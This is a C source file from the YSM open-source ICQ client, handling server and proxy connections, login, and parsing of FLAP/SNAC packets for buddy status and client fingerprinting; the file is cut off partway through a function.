/*    $Id: YSM_Network.c,v 1.220 2007/01/19 03:58:37 rad2k Exp $    */
/*
-======================== ysmICQ client ============================-
        Having fun with a boring Protocol
-======================== YSM_Network.c ============================-

YSM (YouSickMe) ICQ Client. An Original Multi-Platform ICQ client.
Copyright (C) 2002 rad2k Argentina.

YSM is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.

For Contact information read the AUTHORS file.

*/

#include "ysm.h"
#include "icqv7.h"
#include "lists.h"
#include "charset.h"
#include "network.h"
#include "wrappers.h"
#include "commands.h"
#include "prompt.h"
#include "slaves.h"
#include "toolbox.h"
#include "setup.h"
#include "direct.h"

ysm_server_info_t g_sinfo;

int32_t init_network(void)
{
    /* zero all sinfo fields */
    memset(&g_sinfo, 0, sizeof(ysm_server_info_t));

    /* Initial seqnum */
    g_sinfo.seqnum = 1;

    /* buddy list information */
    g_sinfo.blgroupsid        = NULL;
    g_sinfo.blusersid         = NULL;
    g_sinfo.blgroupsidentries = 0;
    g_sinfo.blusersidentries  = -1;

    return 0;
}

int32_t
YSM_HostToAddress( int8_t *inhost, u_int32_t *outaddress )
{
struct hostent    *myhostent;
#if !defined(WIN32) && !defined(_AIX) && !defined(__sun__) && !defined(sun)
struct in_addr    myaddr;
int32_t        retval = 0;
#else
#ifndef    INADDR_NONE
#define    INADDR_NONE    -1
#endif
#endif

    if (inhost == NULL || outaddress == NULL)
        return -1;

    /* first check if we have a number-and-dots notation */
#if !defined(WIN32) && !defined(_AIX) && !defined(__sun__) && !defined(sun)
    retval = inet_aton(inhost, &myaddr);
    if (retval == 0) {
#else
    *outaddress = inet_addr(inhost);
    if (*outaddress == INADDR_NONE) {
#endif
        /* inet_aton failed, we seem to have a hostname
         * instead of a number-and-dots notation as we
         * previously thought
         */

        myhostent = gethostbyname(inhost);
        if (myhostent == NULL) {
            /* unable to resolve hostname */
            return -1;
        }

        /* get the address */
        memcpy(outaddress, myhostent->h_addr, 4);
    }
#if !defined(WIN32) && !defined(_AIX) && !defined(__sun__) && !defined(sun)
    else
        memcpy(outaddress, &myaddr.s_addr, 4);
#endif

    return 0;
}

int32_t YSM_RawConnect(int8_t *host, u_int16_t port)
{
    struct sockaddr_in server;
    int32_t            sock = 0;
    u_int32_t          address = 0;

    /* convert host into an ip address if it isn't already */
    if (YSM_HostToAddress(host, &address) < 0)
        return -1;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)
        return -1;

    server.sin_addr.s_addr = address;
    server.sin_port = htons(port);
    server.sin_family = AF_INET;

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0)
        return -1;

    return sock;
}

/* ProxyHalfConnect:
 *    Takes care of connecting to the proxy server and
 *    returns in order to allow whatever action against
 *    the proxy server is to be taken.
 *
 */

int32_t
YSM_ProxyHalfConnect( int8_t *host, u_int16_t port, struct in_addr *outaddress )
{
int32_t            proxysock = 0;
struct in_addr        address;

    if (host == NULL)
        return -1;

    /* make sure minimum proxy configuration exists */
    if (atoi(YSM_USER.proxy.proxy_host) == 0x00
        || !YSM_USER.proxy.proxy_port)
        return -1;

    /* do we have to resolve the final address ourselves?.
     * the PROXY_RESOLVE flag tells whether we should let
     * the proxy resolve hostnames for us or not.
     * NOTE, make sure we do this before RawConnect so we
     * don't have to close any sockets if failed.
     */

    if (!(YSM_USER.proxy.proxy_flags & YSM_PROXY_RESOLVE)) {
        /* we have to resolve the hostname */
        if (YSM_HostToAddress(host, &address.s_addr) < 0)
            return -1;

        if (outaddress != NULL)
            outaddress->s_addr = address.s_addr;
    }

    /* RawConnect takes care of resolving the host for us */
    proxysock = YSM_RawConnect(
                YSM_USER.proxy.proxy_host,
                YSM_USER.proxy.proxy_port
                );
    if (proxysock < 0)
        return -1;

    return proxysock;
}

int32_t
YSM_ProxyConnect( int8_t *host, u_int16_t port )
{
int32_t            proxysock = 0;
u_int32_t        x = 0;
struct in_addr        address;
int8_t            proxy_string[512], *aux = NULL, *auxb = NULL;

    if (host == NULL)
        return -1;

    proxysock = YSM_ProxyHalfConnect(host, port, &address);
    if (proxysock < 0)
        return -1;

    /* we now create the 'proxy_string' buffer to send to the
     * proxy server. It will be different for Authentication req
     * servers.
     */

    /* do we have to authenticate against this proxy? */
    if (YSM_USER.proxy.proxy_flags & YSM_PROXY_AUTH) {

        u_int8_t    *credential = NULL, *encoded = NULL;
        u_int32_t    length = 0;

        length = strlen(YSM_USER.proxy.username);
        length += strlen(YSM_USER.proxy.password);
        length ++;

        credential = ysm_calloc( 1, length+1, __FILE__, __LINE__ );

        snprintf( credential, length,
                "%s:%s",
                YSM_USER.proxy.username,
                YSM_USER.proxy.password );

        credential[length] = 0x00;

        encoded = YSM_encode64(credential);
        snprintf( proxy_string, sizeof(proxy_string),
                "CONNECT %s:%d HTTP/1.0\r\n"
                "Proxy-Authorization: Basic %s\r\n\r\n",
                (YSM_USER.proxy.proxy_flags & YSM_PROXY_RESOLVE)
                ? (char *)host : inet_ntoa(address),
                port,
                encoded );

        proxy_string[sizeof(proxy_string) - 1] = 0x00;

        ysm_free( credential, __FILE__, __LINE__ );
        credential = NULL;
        ysm_free( encoded, __FILE__, __LINE__ );
        encoded = NULL;

    } else {

        snprintf( proxy_string, sizeof(proxy_string),
                "CONNECT %s:%d HTTP/1.0\r\n\r\n",
                (YSM_USER.proxy.proxy_flags & YSM_PROXY_RESOLVE)
                ? (char *)host : inet_ntoa(address),
                port );

        proxy_string[sizeof(proxy_string) - 1] = 0x00;
    }

    /* we will now send the 'proxy_string' buffer to the proxy
     * and read the response.
     */

    PRINTF(VERBOSE_PACKET, "%s", proxy_string);

    if (SOCK_WRITE(proxysock, proxy_string, strlen(proxy_string)) < 0) {
        /* handle the error correctly */
        close(proxysock);
        return -1;
    }

    /* we use the same send buffer for receiving as well */
    memset(proxy_string, '\0', sizeof(proxy_string));

    /* read the first response */
    if (YSM_READ_LN(proxysock, proxy_string, sizeof(proxy_string)) <= 0) {
        close(proxysock);
        return -1;
    }

    /* parse the response */
    strtok(proxy_string,"\n");
    aux = strtok(proxy_string, "/");
    strtok(NULL, " \t");
    auxb = strtok(NULL, " \t");

    if (aux == NULL || auxb == NULL
    || !strstr( aux, "HTTP" ) || !strstr( auxb, "200" ) ) {

        /* if we get to this point, we got an error on the response.
         * check if it's because we require authentication and we
         * didn't supply one. */

        if (auxb != NULL) {
                   if (strstr( auxb, "401" )) {
                /* authentication required */
                PRINTF( VERBOSE_BASE, MSG_ERR_PROXY2 );
            } else {
                PRINTF( VERBOSE_BASE, "Method FAILED (%s %s)\n", auxb, auxb+strlen(auxb)+1);
            }

        } else {
            /* unknown error in response */
            PRINTF( VERBOSE_BASE, MSG_ERR_PROXY3 );
        }

        /* close the socket and leave */
        close(proxysock);
        return -1;
    }

    /* the response was successfull.
     * this means we are now connected to the proxy server.
     */

    /* read until the end of the headers */
    do {
        x = YSM_READ_LN( proxysock,
                proxy_string,
                sizeof(proxy_string)
                );
    } while (x);


    /* we return the open socket to the proxy server */
    return proxysock;
}


/* YSM_Connect is the main procedure for connecting to
 * servers. It makes use of proxy configuration if any
 * to connect to the proxy servers.
 */

int32_t
YSM_Connect( int8_t *host, u_int16_t port, int8_t verbose )
{
int32_t         mysock = -1, try_count = 0;
u_int32_t        serversize = 0;
struct sockaddr_in    server;

    if (host == NULL || port == 0)
        return -1;

    /* Note, we don't resolve the host address by now because
     * if connecting through proxy, the user might want the
     * proxy to resolve the address by itself.
     */

    /* first check if the user has configured a proxy */
    if (atoi(YSM_USER.proxy.proxy_host) != 0x00) {

        /* connect through the proxy and retry twice */
        do {
            mysock = YSM_ProxyConnect(host, port);
            try_count ++;

        } while (mysock < 0 && try_count < 2);

    } else {
        /* connect directly */
        mysock = YSM_RawConnect(host, port);
    }


    if (mysock < 0) {
        /* connect has failed. */
        return -1;
    }

    /* get our internal IP address through getsockname */
    serversize = sizeof(server);
    getsockname(mysock, (struct sockaddr *)&server, &serversize);
    YSM_USER.d_con.rIP_int = server.sin_addr.s_addr;

    return mysock;
}

/* SignIn to the ICQ Network             */
/* moduled for being able to 'reconnect' */

int YSM_SignIn(void)
{
    u_int16_t port = 0;

    if (YSM_USER.proxy.proxy_flags & YSM_PROXY_HTTPS)
        port = 443;
    else
        port = YSM_USER.network.auth_port;

    YSM_USER.network.rSocket = YSM_Connect(
        YSM_USER.network.auth_host,
        port,
        0x1);

    if (YSM_USER.network.rSocket < 0)
        return YSM_USER.network.rSocket;

    PRINTF(VERBOSE_BASE, "\rLogging in.. [");
    YSM_Init_LoginA(YSM_USER.Uin, YSM_USER.password);

    return YSM_USER.network.rSocket;
}

void YSM_SrvResponse(void)
{
    int8_t    *buf = NULL, error_code[2];
    FLAP_Head  head;
    int32_t    r = 0, pos = 0;
    TLV        login_tlv;

    memset(&head, 0, sizeof(head));
    memset(&error_code, 0, 2);

    r = YSM_READ(YSM_USER.network.rSocket,
        &head,
        FLAP_HEAD_SIZE,
        0);

    if (r < 1 || r != FLAP_HEAD_SIZE) return;

    buf = ysm_calloc(1, Chars_2_Wordb(head.dlen)+1, __FILE__, __LINE__);

    r = YSM_READ(YSM_USER.network.rSocket,
        buf,
        Chars_2_Wordb(head.dlen),
        0);

    if (r < 1 || r != Chars_2_Wordb(head.dlen)) return;

    PRINTF(VERBOSE_PACKET, "[INCOMING Packet]\n");
    DumpPacket(&head, buf);

    switch (head.channelID)
    {
        case YSM_CHANNEL_NEWCON:
            break;

        case YSM_CHANNEL_SNACDATA:
            YSM_Incoming_SNAC(&head, buf, r);
            break;

        case YSM_CHANNEL_FLAPERR:
            break;

        case YSM_CHANNEL_CLOSECONN:
            if (r < (ssize_t)sizeof(TLV))
                break;

            memcpy(&login_tlv, buf, sizeof(TLV));

            /* Server didn't see our disconnection */
            if (buf[0] == 0x2a)
            {
                YSM_Reconnect();
                break;
            }

            /* Check if someone else disconnected us        */
            /* by logging in with OUR UIN #                 */
            if (Chars_2_Wordb(login_tlv.type) == 0x09)
            {
                PRINTF(VERBOSE_BASE, MSG_ERR_SAMEUIN, "\n");
                PRINTF(VERBOSE_BASE,
                    "\n" MSG_ERR_DISCONNECTED "\n");

                YSM_ERROR(ERROR_NETWORK, 0);
                break;
            }

            pos = sizeof(TLV);
            pos += Chars_2_Wordb(login_tlv.len);

            /* sane check */
            if ((u_int32_t)r < (pos + sizeof(TLV)))
                break;

            /* we might now get a TLV type 1 with our UIN */
            memcpy(&login_tlv, buf+pos, sizeof(TLV));
            if (Chars_2_Wordb(login_tlv.type) == 0x01)
                pos += sizeof(TLV) + Chars_2_Wordb(login_tlv.len);

            /* 0x05 is the TLV saying OK! */
            /* if its not here, srv returned an error */
            if (buf[pos] != 0 || buf[pos+1] != 5)
            {
                if (!buf[pos] && buf[pos+1] == 0x04)
                {
                    /* skip the description.. */
                    memcpy(&login_tlv, &buf[pos], sizeof(TLV));
                    pos += sizeof(TLV);
                    pos += Chars_2_Wordb(login_tlv.len);
                }

                if ((u_int32_t)r < (pos + sizeof(TLV) + 2))
                    break;

                pos += sizeof(TLV);
                memcpy(&error_code, &buf[pos], 2);

                PRINTF(VERBOSE_BASE, "\n");

                switch (Chars_2_Wordb(error_code))
                {
                    case 0x0001:
                        PRINTF(VERBOSE_BASE,
                            MSG_ERR_INVUIN, "\n");
                        break;

                    case 0x0004:
                        PRINTF(VERBOSE_BASE,
                            MSG_ERR_INVPASSWD, "\n");
                        break;

                    case 0x0005:
                        PRINTF(VERBOSE_BASE,
                            MSG_ERR_INVPASSWD, "\n");
                        break;

                    case 0x0007:
                        PRINTF(VERBOSE_BASE,
                            MSG_ERR_INVUIN, "\n");
                        break;

                    case 0x0008:
                        PRINTF(VERBOSE_BASE,
                            MSG_ERR_INVUIN, "\n");
                        break;

                    case 0x0015:
                        PRINTF(VERBOSE_BASE,
                            MSG_ERR_TOOMC, "\n");
                        break;

                    case 0x0016:
                        PRINTF(VERBOSE_BASE,
                            MSG_ERR_TOOMC, "\n");
                        break;

                    case 0x0018:
                        PRINTF(VERBOSE_BASE,
                            MSG_ERR_RATE, "\n");
                        break;

                }

                PRINTF(VERBOSE_BASE,
                    "\n" MSG_ERR_DISCONNECTED "\n");
                YSM_ERROR(ERROR_NETWORK, 0);
            }
            else
            {
                if (!(g_sinfo.flags & FL_LOGGEDIN)
                && Chars_2_Wordb(login_tlv.type) == 0x01)
                {
                    YSM_Init_LoginB(&head, buf, r);
                }
                else
                {
                    /* wopz, big error here */
                }
            }
        break;

    default:
        PRINTF(VERBOSE_MOATA,
            "\nEl channel ID es: %d\n", head.channelID);
        PRINTF (VERBOSE_MOATA,
            "[ERR] Inexisting channel ID received");
        PRINTF (VERBOSE_MOATA,
            "inside a FLAP structure.\n");
        PRINTF (VERBOSE_MOATA,
            "As I'm a paranoid one.. i'll disconnect.\n");

        break;
    }

    ysm_free(buf, __FILE__, __LINE__);
}


static const u_int8_t icqCloneIdent[] = {
    0x00,0x01,0x00,0x03,0x00,0x02,0x00,0x01,0x00,0x03,0x00,0x01,
    0x00,0x15,0x00,0x01,0x00,0x04,0x00,0x01,0x00,0x06,0x00,0x01,
    0x00,0x09,0x00,0x01,0x00,0x0A,0x00,0x01,
};

static const u_int8_t Rates_Acknowledge[] = {
    0x00,0x01,0x00,0x02,0x00,0x03,0x00,0x04,0x00,0x05,
};

int
YSM_Incoming_SNAC( FLAP_Head *head, char *buf, int buflen )
{
SNAC_Head     thesnac;
int         a = 0;

    /* copy, and beware of padding of structs */
    memcpy( &thesnac, buf, SNAC_HEAD_SIZE );
    memcpy( &thesnac.ReqID, &buf[6], sizeof(int32_t) );

    PRINTF( VERBOSE_MOATA,
        "\nSNAC id %x and sub %x\n",Chars_2_Wordb(thesnac.familyID),
        Chars_2_Wordb( thesnac.SubTypeID ) );

    switch(Chars_2_Wordb( thesnac.familyID ))
    {
        case YSM_BASIC_SERVICE_SNAC:
            PRINTF( VERBOSE_MOATA,
                "Basic Service SNAC arrived!\n" );

        switch(Chars_2_Wordb( thesnac.SubTypeID ))
        {
            case YSM_SERVER_IS_READY:
                PRINTF(VERBOSE_MOATA,
                    "Server Ready. Notifying the\n");
                PRINTF(VERBOSE_MOATA,
                    "server that we are an ICQ client\n");


                a = YSM_SendSNAC( 0x1,
                        0x17,
                        0x0,
                        0x0,
                        icqCloneIdent,
                        sizeof(icqCloneIdent),
                        Chars_2_Wordb(head->seq),
                        NULL );
                break;


            case YSM_ACK_ICQ_CLIENT:
                YSM_RequestRates();
                break;

            case YSM_RATE_INFO_RESP:
            /* Just an ACK that we received the rates */
                YSM_SendSNAC( 0x1,
                    0x08,
                    0x0,
                    0x0,
                    Rates_Acknowledge,
                    sizeof( Rates_Acknowledge ),
                    g_sinfo.seqnum++,
                    NULL );

            /* ICBM, CAPABILITES, YOU NAME IT! */
                YSM_RequestICBMRights();
                YSM_RequestBuddyRights();
            /* Request Personal */
                YSM_RequestPersonal();
                break;


            /* This is either a status change Acknowledge    */
            /* Or a personal information reply.        */
            /* We check its request ID to be 0x000E as sent */
            /* in the first request. If so, proceed with    */
            /* the startup. Else, it's a status change.    */

            /* case YSM_SCREEN_INFO_RESP: same thing */
            case YSM_STATUS_CHANGE_ACK:
                if(thesnac.ReqID == 0xE000000
                || thesnac.ReqID == 0x000000E ) {

                    YSM_IncomingPersonal( head,
                            &thesnac,
                               &buf[SNAC_HEAD_SIZE] );

                    YSM_SendCapabilities();

                    /* If we have no slaves we would */
                    /* be sending an empty packet. */
                    if (g_slave_list.length > 0)
                        YSM_SendContacts();

                    YSM_SendICBM();

                    if (YSM_USER.status != STATUS_INVISIBLE) {
                        YSM_ChangeStatus(
                            YSM_USER.status
                            );
                    }

                    /* SET US AS READY */
                    YSM_SendCliReady();
                    YSM_RequestContacts ();
                    YSM_RequestOffline ();

                }
                else
                    PRINTF(VERBOSE_MOATA,
                        "Status Changed\n");

                break;

            default:
                break;

        }

        break;


        case YSM_MESSAGING_SNAC:

        switch(Chars_2_Wordb( thesnac.SubTypeID ))
        {
            case YSM_MESSAGE_TO_CLIENT:
                YSM_ReceiveMessage( head,
                        &thesnac,
                         &buf[SNAC_HEAD_SIZE] );
                break;

            case YSM_MESSAGE_FROM_CLIENT:
                break;

            case YSM_CLIENT_ACK:

                YSM_Incoming_ClientAck(head,
                        &thesnac,
                        &buf[SNAC_HEAD_SIZE]);
                break;

            case YSM_HOST_ACK:    /* just a srv ack */

                /* call Incoming_Scan if we were waiting
                 * a reply from a previous scan.
                 */

                if (0 != g_sinfo.scanqueue)
                    YSM_Incoming_Scan(&thesnac);

                break;

            case YSM_SRV_MISSED_CALLS:
                PRINTF(VERBOSE_MOATA,
                    "\n" MSG_AOL_WARNING );
                break;

            case YSM_CLI_SRV_ERRORMSG:
                /* We used to have lots of 0x1 subtypes */
                /* printf's on the screen big mistake! not */
                /* all of the error-codes are known and */
                /* they still are useless for us. Plus, no */
                /* printf's of %s now. Most of these errors */
                /* are caused by really sucking features of */
                /* the new-era icq clients, such as plugins. */

                /* We want this for our WAR mode, */
                /* undocumented of course ;)  for not wasting */
                /* time searching in the slaves list, use a */
                /* global flag, yak :( */

                if (0 != g_sinfo.scanqueue)
                    YSM_Incoming_Scan( &thesnac );

                break;

            /* Dont bother the user with new subtypes arriving */
            default:
                break;
        }

        break;


        case YSM_BUDDY_LIST_SNAC:

        switch(Chars_2_Wordb(thesnac.SubTypeID))
        {
            case YSM_SRV_ONCOMING_BUD:
            case YSM_SRV_OFFGOING_BUD:
                YSM_BuddyChangeStatus( head, &thesnac,
                    &buf[SNAC_HEAD_SIZE] );
                break;

            case YSM_SRV_REJECT_NOTICE:
                /* woha this seems serious..mama mia. */
                break;

            case YSM_SRV_RIGHTS_INFO:
                /* reply to rights request, just */
                /* we wont care about the data */
                break;

            default:

                PRINTF(VERBOSE_MOATA,
                "\n[ERR]:  Unknown subtype");
                PRINTF(VERBOSE_MOATA,
                ": %x - in Buddy List SNAC\n",
                Chars_2_Wordb(thesnac.SubTypeID));

                break;
        }

        break;

        case YSM_MULTIUSE_SNAC:
        switch(Chars_2_Wordb( thesnac.SubTypeID) )
        {
            case YSM_SRV_SEND_RESP:
                YSM_IncomingMultiUse(head, &thesnac,
                    &buf[SNAC_HEAD_SIZE]);
                break;

            default:
                break;
        }

        break;

        case YSM_ICQV8FUNC_SNAC:
        switch(Chars_2_Wordb( thesnac.SubTypeID ))
        {
            case YSM_SRV_SEND_ROSTER:
                YSM_BuddyIncomingList( head, thesnac,
                &buf[SNAC_HEAD_SIZE], buflen);
                YSM_SendContacts();
                break;

            case YSM_SRV_ROSTER_OK:
                break;

            case YSM_SRV_CHANGE_ACK:
                YSM_BuddyIncomingChange( head, thesnac,
                &buf[SNAC_HEAD_SIZE]);
                break;

            default:
                break;
        }


        break;

        case YSM_REGISTRATION_SNAC:
            break;

        default:
            break;

    }

    return (Chars_2_Wordb(head->dlen) + FLAP_HEAD_SIZE);
}

void
YSM_BuddyChangeStatus( FLAP_Head *flap, SNAC_Head *snac, int8_t *data )
{
struct    YSM_DIRECT_CONNECTION    dcinfo;
u_int16_t            flags = 0, status = STATUS_OFFLINE;
u_int32_t            fprint = 0, uinlen = 0;
time_t                onsince = 0;
int8_t                *puin = NULL;
slave_t            *victim = NULL;


    if (flap == NULL || snac == NULL || data == NULL || data[0] == '\0')
        return;

    uinlen = data[0];
    if (uinlen >= MAX_UIN_LEN) return;

    puin = ysm_calloc(1, uinlen+1, __FILE__ , __LINE__);
    memcpy(puin, data+1, uinlen);

    victim = YSM_QuerySlaves(SLAVE_UIN, NULL, atol(puin), 0);
    if (victim == NULL) {
        PRINTF( VERBOSE_MOATA,
            "YSM_BuddyChangeStatus: "
            "Received a status change for UIN %s which is not "
            "in your list.\n", puin );

        ysm_free( puin, __FILE__, __LINE__ );
        puin = NULL;
        return;
    }

    memset(&dcinfo, 0, sizeof(dcinfo));

    switch(Chars_2_Wordb( snac->SubTypeID )) {

        case YSM_SRV_ONCOMING_BUD:
            YSM_BuddyParseStatus(
                    victim,
                    flap,
                    snac,
                    data,
                    uinlen+1,
                    &dcinfo,
                    &fprint,
                    &status,
                    &flags,
                    &onsince );
            break;

        case YSM_SRV_OFFGOING_BUD:
            g_sinfo.onlineslaves--;
            break;

        default:
            ysm_free( puin, __FILE__, __LINE__ );
            puin = NULL;
            return;
    }

    YSM_BuddyUpdateStatus( victim,
                &dcinfo,
                status,
                flags,
                fprint,
                onsince );

    ysm_free( puin, __FILE__, __LINE__ );
    puin = NULL;
}

void
YSM_ParseCapabilities( slave_t *victim, int8_t *caps, int32_t len )
{
int32_t        x, y;
u_int8_t    cap_pre[3], capnum[3];

    if (victim == NULL || caps == NULL || len <= 0)
        return;

    victim->caps = 0x00;

    for (x = 0; x < len && ((len-x) >= 16); x += 16) {
        memcpy(&cap_pre[0], caps+x, 3);

        if (!memcmp(cap_pre, CAP_PRECAP, 3)) {
            snprintf(capnum, sizeof(capnum), "%c", *(caps+x+3));

            if (!memcmp(capnum, CAP_SRVRELAY, 2)) {
                victim->caps |= CAPFL_SRVRELAY;
                PRINTF( VERBOSE_MOATA,
                    "Found AIM Cap: SRVRELAY\n");

            } else if (!memcmp(capnum, CAP_ISICQ, 2)) {

                victim->caps |= CAPFL_ISICQ;
                PRINTF( VERBOSE_MOATA,
                    "Found AIM Cap: ISICQ\n");


            } else if (!memcmp(capnum, CAP_UTF8, 2)) {

                victim->caps |= CAPFL_UTF8;
                PRINTF( VERBOSE_MOATA,
                    "Found AIM Cap: UTF8\n");

            } else {

                PRINTF( VERBOSE_MOATA,
                    "Unknown AIM capability found:"
                    " \\x%.2X\n", capnum );
            }

            continue;

        } else if (!memcmp(cap_pre, CAP_PRERTF, 3)) {
            snprintf(capnum, sizeof(capnum), "%c", *(caps+x+3));

            if (!memcmp(capnum, CAP_RTF, 2)) {
                victim->caps |= CAPFL_RTF;
                PRINTF( VERBOSE_MOATA,
                    "Found RTF Cap: RTF\n");
            } else {
                PRINTF( VERBOSE_MOATA,
                    "Unknown RTF capability found:"
                    " \\x%.2X\n", capnum );
            }

            continue;

        } else {    /* might be Fingerprinting Capabilities */

            if (!memcmp(caps+x, CAP_M2001, 16)) {
                PRINTF( VERBOSE_MOATA,
                    "Found fprint Cap: M2001\n");

                victim->fprint = FINGERPRINT_M2000_CLIENT;

            } else if (!memcmp(caps+x, CAP_M2001_2, 16)) {
                PRINTF( VERBOSE_MOATA,
                    "Found fprint Cap: M2001_2\n");

                victim->fprint = FINGERPRINT_M20012_CLIENT;

            } else if (!memcmp(caps+x, CAP_M2002, 16)) {
                PRINTF( VERBOSE_MOATA,
                    "Found fprint Cap: M2002\n");

                victim->fprint = FINGERPRINT_M2002_CLIENT;

            } else if (!memcmp(caps+x, CAP_MLITE, 16)) {
                PRINTF( VERBOSE_MOATA,
                    "Found fprint Cap: ICQ LITE\n");

                victim->fprint = FINGERPRINT_MICQLITE_CLIENT;

            } else if (!memcmp(caps+x, CAP_SIMICQ, 16)) {
                PRINTF( VERBOSE_MOATA,
                    "Found fprint Cap: SIMICQ\n");

                victim->fprint = FINGERPRINT_SIMICQ_CLIENT;

            } else if (!memcmp(caps+x, CAP_MICQ, 16)) {
                PRINTF( VERBOSE_MOATA,
                    "Found fprint Cap: MICQ\n");

                victim->fprint = FINGERPRINT_MICQ_CLIENT;

            } else if (!memcmp(caps+x, CAP_TRILL_NORM, 16)) {
                PRINTF( VERBOSE_MOATA,
                    "Found fprint Cap: TRILLIAN\n");

                victim->fprint = FINGERPRINT_TRILLIAN_CLIENT;

            } else if (!memcmp(caps+x, CAP_TRILL_CRYPT, 16)) {
                PRINTF( VERBOSE_MOATA,
                    "Found fprint Cap: TRILLIAN CRYPT\n");

                victim->fprint = FINGERPRINT_TRILLIAN_CLIENT;

            } else if (!memcmp(caps+x, CAP_LICQ, 16)) {
                PRINTF( VERBOSE_MOATA,
                    "Found fprint Cap: LICQ\n");

                victim->fprint = FINGERPRINT_LICQ_CLIENT;
            } else {

                PRINTF( VERBOSE_MOATA,
                    "Found an Unknown capability:\n");

                for (y = 0; y < 16; y++)
                    PRINTF( VERBOSE_MOATA,
                        "\\x%.2x", *(caps+x+y));

                PRINTF( VERBOSE_MOATA, "\n" );
            }
        }

    }

    /* this is a patch for ICQ2Go who can't take UTF8 */
    if (victim->fprint == FINGERPRINT_MICQLITE_CLIENT
        && !(victim->caps & CAPFL_ISICQ)) {

            victim->caps &= ~CAPFL_UTF8;
            victim->fprint = FINGERPRINT_ICQ2GO_CLIENT;
            PRINTF(VERBOSE_MOATA, "Found an ICQ2Go Client\n");
    }

}

void
YSM_BuddyParseStatus( slave_t            *victim,    /* IN */
        FLAP_Head            *flap,        /* IN */
        SNAC_Head            *snac,        /* IN */
        int8_t                *data,        /* IN */
        int32_t                pos,        /* IN */
        struct YSM_DIRECT_CONNECTION    *dcinfo,    /* OUT */
        u_int32_t            *fprint,    /* OUT */
        u_int16_t            *status,     /* OUT */
        u_int16_t            *flags,     /* OUT */
        time_t                *onsince )    /* OUT */
{
int8_t    newstatus[2], newflags[2], notfound = TRUE, *aux = NULL, newfprint[4];
int8_t    rdcCookie[4];
int32_t    x = 0, len = 0;
TLV    thetlv;

    if (victim == NULL || flap == NULL || snac == NULL || data == NULL)
        return;

    memset(&newstatus, 0, 2);
    memset(&newflags, 0, 2);

    x = pos;
    /* We will use the variable x for going through all the TLV's */
    /* Thats why we've got to start where the first TLV is. */
    x += 4;            /* Following 2 Words */

    while ((int32_t)(x+sizeof(TLV)) < (int32_t)(Chars_2_Wordb(flap->dlen) - SNAC_HEAD_SIZE))
    {
        memcpy(&thetlv, data+x, sizeof(thetlv));
                x += sizeof(TLV);
                len = Chars_2_Wordb(thetlv.len);

                switch(Chars_2_Wordb(thetlv.type)) {
            case 0xA:
                if (len > 0) {
                    memcpy( &dcinfo->rIP_ext, &data[x], 4 );
                    x += len;
                }
                break;

            /* Direct Connection Info */
            case 0xC:
                if (len > 0) {
                    /* Internal IP Address */
                    memcpy(&dcinfo->rIP_int, &data[x], 4);

                    /* Port where client is listening */
                    memcpy( &dcinfo->rPort, &data[x+6], 2 );

                    /* Protocol Version */
                    memcpy( &dcinfo->version,
                        &data[x+9],
                        2 );

                    /* DC Cookie */
                    rdcCookie[0] = data[x+14];
                    rdcCookie[1] = data[x+13];
                    rdcCookie[2] = data[x+12];
                    rdcCookie[3] = data[x+11];

                    memcpy(&dcinfo->rCookie, rdcCookie, 4);

                    /* Do fingerprinting
                     * Fist check if theres the YSM
                     * encryption  identification,
                     * else look for common
                     * YSM clients (old ones) */

                    *fprint = Chars_2_DW(&data[x+31]);
                    if ( *fprint
                    != FINGERPRINT_YSM_CLIENT_CRYPT ) {
                        newfprint[0] = data[x+26];
                        newfprint[1] = data[x+25];
                        newfprint[2] = data[x+24];
                        newfprint[3] = data[x+23];

                        *fprint = Chars_2_DW(newfprint);
                    }
                    x += len;
                }

                break;

            /* Capabilities */
            case 0x0D:
                if (len > 0) {
                    YSM_ParseCapabilities(victim,
                            data+x,
                            len);
                    x += len;
                }
                break;

            case 0x6:
                notfound = FALSE;
                if (len > 0) {
                    memcpy( &newflags, data+x, 2 );
                    memcpy( &newstatus, data+x+2, 2 );
                    x += len;
                }
                break;


            case 0x3:
                /* time_t */
                if (len == 0x4)    {
                    aux = (int8_t *)onsince;
                    aux[0] = data[x+3];
                    aux[1] = data[x+2];
                    aux[2] = data[x+1];
                    aux[3] = data[x];
                    *onsince -= YSM_USER.delta;
                }

                /* just cheat and quit, we only care */
                 /* about the STATUS and online since */
                /* by now.
                x = Chars_2_Wordb( flap->dlen )
                    - SNAC_HEAD_SIZE; */
                    x += sizeof(TLV) + len;

                break;

            default:
                /* data + 2 should contain the TLV */
                /* len data field. */
                x += len;
                break;
        }
    }

     /* This is really raro, at a beginning I believe i was */
     /* actually receiving the ONLINE status change, but it */
     /* now seems i'm not! Anyways, we know that if its an */
     /* ONCOMING bud message and we dont find the status, */
     /* its online, smart, huh? =) */

    if (notfound) *status = STATUS_ONLINE;
    else *status = Chars_2_Wordb(newstatus);

    *flags = Chars_2_Wordb(newflags);
}


void YSM_BuddyUpdateStatus( slave_t        *victim,
        struct YSM_DIRECT_CONNECTION    *dcinfo,
        u_int16_t            status,
        u_int16_t            flags,
        u_int32_t            fprint,
        time_t                onsince )
{

int8_t        status_string[MAX_STATUS_LEN], time_string[10];
#ifdef COMPACT_DISPLAY
int8_t        oldstatus_string[MAX_STATUS_LEN];
#endif
time_t        current_time;
struct tm    *time_stamp;
int32_t        x = 0;

    if (victim == NULL || dcinfo == NULL)
        return;

    YSM_WriteStatus(status, status_string);
    current_time = time(NULL);

    victim->d_con.rIP_int    = dcinfo->rIP_int;
    victim->d_con.rIP_ext    = dcinfo->rIP_ext;
    victim->d_con.rPort    = htons(dcinfo->rPort);
    victim->d_con.rCookie    = dcinfo->rCookie;
    victim->d_con.version    = htons(dcinfo->version);

    if (flags & STATUS_FLBIRTHDAY) {
        if (victim->BudType.birthday != 0x2)
            victim->BudType.birthday = 0x1;
    } else
        victim->BudType.birthday = FALSE;

    time_stamp = localtime( &current_time );
    strftime( time_string, 9, "%H:%M:%S", time_stamp );

    /* Fingerprint the remote client */
    switch( fprint ) {

        case FINGERPRINT_MIRANDA_CLIENT:
            victim->fprint = FINGERPRINT_MIRANDA_CLIENT;
            break;

